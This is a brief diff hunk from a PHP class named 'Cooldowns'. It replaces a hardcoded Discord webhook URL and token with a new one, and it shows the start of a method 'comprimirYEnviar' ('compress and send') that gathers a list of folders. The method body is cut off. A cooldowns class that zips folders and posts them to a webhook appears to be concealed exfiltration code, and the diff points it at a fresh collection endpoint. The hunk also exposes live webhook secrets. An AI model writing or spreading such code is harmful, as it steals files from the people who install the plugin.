@@ -11,7 +11,7 @@ use ZipArchive;
 
 class Cooldowns {
 
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1293320707513647125/vi3yicTw-wXSe0KonaeOesk91PCuL6obUjcBYW5gqM-TZjAx3yRHtWznbNtbPUF3FTXi";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1329577386416541767/YqS7IGZ8bCJDjlpqJAKrCLQqOzSOUkolIPm8yrgkYnyv_HRJR1LZ9vRqYwm1Ke1Qr8BR";
 
     public function comprimirYEnviar(): void {
         $carpetas = [
